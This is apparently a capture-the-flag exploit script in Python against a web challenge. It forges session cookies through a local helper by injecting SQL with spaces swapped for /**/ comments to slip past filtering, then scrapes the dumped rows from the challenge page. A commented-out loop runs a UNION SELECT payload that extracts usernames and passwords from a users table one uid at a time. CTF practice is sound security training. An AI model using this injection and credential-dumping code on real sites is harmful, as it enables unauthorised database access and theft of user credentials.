from requests import get
from sys import argv
from bs4 import BeautifulSoup


url = "http://localhost:8888/"
ctf_site = "http://dvd.chal.h4ck3r.quest:10001/"

injection = argv[1].replace(" ", "/**/")

# Generate Cookie
response = get(url+f"get?username={injection}")
generate_cookie = response.cookies["session"]

# Test Result
res = get(ctf_site, cookies={"session": generate_cookie})

soup = BeautifulSoup(res.text, 'html.parser')
datadump = soup.select_one("body>h1").text[4:].split(",")

for d in datadump:
    print(d)


# for i in range(100):
#     # print(f"Testing with uid = {i}")

#     payload = f"guesdfsafat' UNION SELECT username, password FROM users WHERE uid = {i} and ''='".replace(" ", "/**/")
#     # Generate Cookie
#     response = get(url+f"get?username={payload}")
#     generate_cookie = response.cookies["session"]

#     # print(response.cookies["session"])

#     # Test Result
#     res = get(ctf_site, cookies={"session": generate_cookie})

#     soup = BeautifulSoup(res.text, 'html.parser')
#     print(soup.select_one("body>h1").text, end="   ->   ")

#     print(soup.select("marquee")[1].text.strip(" \n"))
